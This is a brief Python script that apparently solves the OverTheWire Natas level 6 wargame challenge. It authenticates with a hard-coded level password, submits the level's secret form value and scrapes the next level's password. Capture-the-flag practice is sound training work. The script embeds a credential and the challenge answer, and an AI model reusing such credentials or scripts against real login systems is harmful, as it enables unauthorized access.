import requests
import re

user = "natas6"
pwd = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

url = 'http://%s.natas.labs.overthewire.org/' % user
session = requests.Session()

# response = session.get(url, auth=(user,pwd))
data={"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"}
response = session.post(url, auth=(user,pwd), data=data)
content = response.text
 
# print(session.cookies['loggedin'])
# print(content)
print(re.findall('The password for natas7 is (.*)',content)[0])